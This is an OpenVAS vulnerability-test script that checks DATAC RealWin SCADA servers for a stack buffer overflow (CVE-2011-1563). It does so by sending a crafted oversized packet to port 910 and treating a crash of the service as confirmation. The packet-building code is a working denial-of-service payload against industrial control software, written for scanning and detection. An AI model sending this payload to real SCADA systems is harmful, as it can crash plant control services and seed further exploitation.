###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_realwin_scada_on_fc_binfile_bof_vuln.nasl 7044 2017-09-01 11:50:59Z teissa $
#
# DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_impact = "Successful exploitation may allow remote attackers to execute
arbitrary code in the context of the application. Failed exploit attempts will
cause a denial-of-service condition.

Impact Level: System/Application";

tag_affected = "DATAC RealFlex RealWin 2.1 (Build 6.1.10.10) and prior.";

tag_insight = "The flaw is due to a boundary error when processing various
On_FC_BINFILE_FCS_*FILE packets, which can be exploited to cause a stack
based buffer overflow by sending specially crafted packets to port 910.";

tag_solution = "No solution or patch was made available for at least one year
since disclosure of this vulnerability. Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective
features, remove the product or replace the product by another one.";

tag_summary = "This host is running DATAC RealWin SCADA Server and is prone to
buffer overflow vulnerability.";

if(description)
{
  script_id(902528);
  script_version("$Revision: 7044 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-01 13:50:59 +0200 (Fri, 01 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_bugtraq_id(46937);
  script_cve_id("CVE-2011-1563");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_name("DATAC RealWin SCADA Server On_FC_CONNECT_FCS_a_FILE Buffer Overflow Vulnerability");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/43848");
  script_xref(name : "URL" , value : "http://www.exploit-db.com/exploits/17417/");
  script_xref(name : "URL" , value : "http://aluigi.altervista.org/adv/realwin_5-adv.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Buffer overflow");
  script_dependencies("find_service.nasl");
  script_require_ports(910);
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "solution" , value : tag_solution);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name:"solution_type", value:"WillNotFix");
  exit(0);
}


## Default Port
port = 910;
if(!get_port_state(port)){
  exit(0);
}

## Open TCP Socket
soc = open_sock_tcp(port);
if(!soc) {
  exit(0);
}

## Confirm Application
banner = recv(socket:soc, length:100);
if(banner !~ '^\x10\x23\x54\x67\x00'){
  exit(0);
}

## Building Exploit
head = raw_string(0x10, 0x23, 0x54, 0x67, 0x24, 0x08, 0x00, 0x00,
                  0x01, 0x00, 0x10, 0x00, 0x01, 0x00, 0x00, 0x00,
                  0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0xff, 0xff,
                  0x00, 0x00);

junk = crap(data:"a", length:2058);

tail = raw_string(0x00, 0x35, 0x1c, 0x45, 0x54, 0x01, 0x00, 0x00,
                  0x40, 0x00, 0x02, 0x00, 0x00, 0x00);

## Sending Exploit
send(socket:soc, data: head + junk + tail);
close(soc);

## Waiting
sleep(5);

## Confirm Vulnerability
soc = open_sock_tcp(port);
if(!soc){
 security_message(port);
}
